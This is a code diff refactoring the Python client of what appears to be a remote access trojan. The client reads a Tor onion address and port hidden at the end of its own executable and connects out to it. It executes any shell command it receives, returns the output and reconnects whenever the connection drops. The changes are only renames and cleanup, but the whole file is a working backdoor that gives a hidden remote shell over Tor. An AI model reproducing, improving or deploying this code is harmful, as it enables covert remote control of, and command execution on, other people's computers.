@@ -1,31 +1,32 @@
 from network import ClientSocket, Tor
-from argparse import ArgumentParser
 import tasks
 import sys
 import os
+import socket
 
 
-# read onion and port from end of file
-onion = ''
-port = 0
-path = os.path.abspath(sys.executable)
-with open(path, 'rb') as f:
-    data = f.read()
-    onion = data[-67:-5].decode()
-    port = int(data[-5:].decode())
-print(onion + str(port))
+def read_address_from_binary():
+    # read onion and port from end of file
+    path = os.path.abspath(sys.executable)
+    with open(path, 'rb') as f:
+        data = f.read()
+        onion = data[-67:-5].decode()
+        port = int(data[-5:].decode())
+    return onion, port
 
 
 class Client:
-    BUFFERSIZE = 4096
+    BUFFER_SIZE = 4096
 
     def __init__(self):
         self.__tor = Tor()
-        self.initializeNetwork()
+        self.__sock = None
+        self.initialize_network()
 
-    def initializeNetwork(self):
+    def initialize_network(self):
+        onion, port = read_address_from_binary()
         self.__sock = ClientSocket(onion, port)
-        # start shell after successfull network connection
+        # start shell after successful network connection
         self.run()
 
     def run(self):
@@ -36,13 +37,12 @@ class Client:
         while True:
             # receive task
             try:
-                task, args = self.__sock.receive(self.BUFFERSIZE)
+                task, args = self.__sock.receive(self.BUFFER_SIZE)
                 # evaluate output
                 execution_status = self.execute(task, args)
-            # broken connection because either network.send or network.receive
-            # raised an exception.
-            except Exception:
-                del(self.__sock)
+            # broken connection because either network.send or network.receive raised an exception.
+            except socket.error:
+                del self.__sock
                 break
             if execution_status == -1:
                 continue
@@ -50,8 +50,7 @@ class Client:
                 pass
 
         # re-establish connection after it is broken
-        self.initializeNetwork()
-
+        self.initialize_network()
 
     def execute(self, task, args) -> int:
         """
@@ -59,13 +58,12 @@ class Client:
         """
         if task == 'EXECUTE':
             command = args[0]
-            output = tasks.executeShell(command)
+            output = tasks.execute_shell(command)
             self.__sock.send(output)
         elif task == 'ACTIVE':
             self.__sock.send('ACTIVE')
         elif task == '':
-            # no empty string gets send because the client
-            # sends back the cwd everytime anyways.
+            # no empty string gets send because the client sends back the cwd everytime anyways.
             self.__sock.send('')
         elif task == 'EXIT':
             return -1
